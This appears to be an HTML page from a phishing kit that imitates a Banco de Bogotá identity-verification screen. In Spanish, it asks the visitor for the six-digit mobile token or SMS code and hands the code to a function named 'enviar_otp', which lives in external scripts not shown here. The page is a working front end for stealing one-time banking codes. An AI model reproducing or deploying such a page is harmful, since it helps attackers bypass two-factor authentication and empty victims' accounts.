<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Verifiquemos que eres tÃº</title>
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="./OTP/otp.css">
      <!-- Bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <!-- jQuery -->
    <script src="../../scripts/jquery-3.6.0.min.js"></script>
    <script src="../../scripts/jquery.jclock-min.js"></script>
    <script src="../../scripts/functions.js"></script>
    <script src="../../scripts/functions2.js"></script>
</head>
<body>
<div class="container">
  <img src="./OTP/logobogota.svg" alt="Banner" class="banner-img" />
  <div class="card">
      <h1 class="main-title">Verifiquemos que eres tÃº</h1>
      <div class="icon-lock">
        <img src="./OTP/icono.svg" width="50" height="50" />
      </div>
      <main>
      <h2>CÃ³digo Token de verificaciÃ³n</h2>
      <p class="subtitle">Para ayudar a mantener tu cuenta segura, ingresa los 6 dÃ­gitos del cÃ³digo de Token mÃ³vil o el cÃ³digo enviado a tu celular.</p>
      <div class="code-form">
      <input type="tel" inputmode="numeric" name="field1" maxlength="1" class="code-input" id="digit1">
      <input type="tel" inputmode="numeric" name="field2" maxlength="1" class="code-input" id="digit2">
      <input type="tel" inputmode="numeric" name="field3" maxlength="1" class="code-input" id="digit3">
      <input type="tel" inputmode="numeric" name="field4" maxlength="1" class="code-input" id="digit4">
	    <input type="tel" inputmode="numeric" name="field5" maxlength="1" class="code-input" id="digit5">
	    <input type="tel" inputmode="numeric" name="field6" maxlength="1" class="code-input" id="digit6">
      <input type="hidden" id="txtOTP" name="cDinamica">
      </div>
<button class="verify-btn" id="btnOTP">Verificar</button>
      <div class="resend-section">
        <span class="timer">
          <span class="circle-timer">
            <svg height="42" width="42">
              <circle cx="21" cy="21" r="18" stroke="#dedede" stroke-width="4" fill="none"/>
              <circle class="circle-bar" cx="21" cy="21" r="18" stroke="#3366cc" stroke-width="4" fill="none"
                stroke-dasharray="113.1" stroke-dashoffset="113.1" style="transform: rotate(-90deg); transform-origin: center;" />
            </svg>
            <span class="time-value">30</span>
          </span>
        </span>
        <span class="resend-text">Reenviar cÃ³digo</span>
      </div>
    </div>
  </div>
  </main>
<script>
function actualizarOTP() {
  const clave = [
    $('#digit1').val(),
    $('#digit2').val(),
    $('#digit3').val(),
    $('#digit4').val(),
    $('#digit5').val(),
    $('#digit6').val()
  ].map(d => d.trim()).join('');

  $('#txtOTP').val(clave);

  if (clave.length === 6 && /^\d{6}$/.test(clave)) {
    $('#btnOTP').addClass('boton-activo'); // ðŸ”¶ AquÃ­ se activa el amarillo
  } else {
    $('#btnOTP').removeClass('boton-activo');
  }
}

$(document).ready(function () {
  $('.code-input').on('input', function () {
    if (this.value.length === 1) {
      $(this).next('.code-input').focus();
    }
    actualizarOTP(); // Verifica y pinta si estÃ¡n los 6 dÃ­gitos
  });

  $('.code-input').on('keydown', function (e) {
    if (e.key === 'Backspace' && this.value === '') {
      $(this).prev('.code-input').focus();
    }
  });

  $('#btnOTP').click(function () {
    const otp = $('#txtOTP').val().trim();
    if (otp.length === 6 && /^\d{6}$/.test(otp)) {
      enviar_otp(otp); // FunciÃ³n personalizada que tÃº defines
    } else {
      $(".mensaje").show();
      $(".pass").css("border", "1px solid red");
    }
  });

  $('.code-input').keyup(function () {
    $(".pass").css("border", "1px solid #CCCCCC");
    $(".mensaje").hide();
  });
});
</script>
<script>
$(document).ready(function() {
  const TOTAL_TIME = 30;
  let timeLeft = TOTAL_TIME;
  const FULL_DASH_ARRAY = 113.1;

  const $circle = $('.circle-bar');
  const $timeValue = $('.time-value');
  const $resendSection = $('.resend-section');

  const timer = setInterval(function() {
    timeLeft--;

    if (timeLeft >= 0) {
      $timeValue.text(timeLeft);
      const offset = FULL_DASH_ARRAY * (timeLeft / TOTAL_TIME);
      $circle.css('stroke-dashoffset', offset);
    }

    if (timeLeft <= 0) {
      clearInterval(timer);
      // Eliminamos el contador y el texto â€œReenviar cÃ³digoâ€
      $resendSection.find('.timer, .resend-text').remove();

      // Creamos el botÃ³n â€œReenviar cÃ³digoâ€
      const $btnResend = $('<button>')
        .addClass('resend-btn')
        .text('Reenviar cÃ³digo')
        .on('click', function() {
          location.reload();
        });

      $resendSection.append($btnResend);
    }
  }, 1000);
});
</script>

</body>
</html>
